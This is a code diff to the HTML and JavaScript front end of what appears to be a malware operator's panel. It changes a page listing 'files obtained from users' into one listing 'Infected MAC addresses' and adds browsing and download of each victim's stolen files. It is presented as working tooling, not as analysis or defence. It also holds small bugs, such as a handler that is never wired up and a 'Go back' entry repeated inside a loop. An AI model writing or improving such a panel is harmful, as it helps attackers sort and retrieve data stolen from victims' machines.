@@ -4,19 +4,37 @@
         <title>Obtained files</title>
     </head>
     <body>
-        <h2 style="left: 35%;position: relative;">List of files obtained from users.</h2>
+        <h2 id="title" style="left: 35%;position: relative;">Infected MAC addresses</h2>
         <ul id="filesList">
 
         </ul>
         <script>
-            fetch("/", {
+            function folderList() {
+              fetch("/", {
+                  method: "GET"
+              }).then(value => value.json())
+              .then(json => {
+                  document.getElementById("filesList").innerHTML = ""
+                  document.getElementById("title").innerHTML = "Infected MAC addresses"
+                  json.forEach(element => {
+                      document.getElementById("filesList").innerHTML += '<li onClick="goToDownloadFile(event)" style="cursor:pointer;margin:30px">' + element + "</li>"
+                  });
+              });
+            }
+            folderList()
+            function exploreFolder(e) {
+              fetch(`/${e.target.textContent}`, {
                 method: "GET"
-            }).then(value => value.json())
-            .then(json => {
+              }).then(value => value.json())
+              .then(json => {
+                document.getElementById("filesList").innerHTML = ""
+                document.getElementById("title").innerHTML = `${e.target.textContent}'s files'`
                 json.forEach(element => {
+                  document.getElementById("filesList").innerHTML += '<li onClick="folderList()" style="cursor:pointer;margin:30px">Go back</li>'
                     document.getElementById("filesList").innerHTML += '<li onClick="goToDownloadFile(event)" style="cursor:pointer;margin:30px">' + element + "</li>"
                 });
-            });
+              })
+            }
             function goToDownloadFile(e) {
                 window.location.href = e.target.textContent
             }
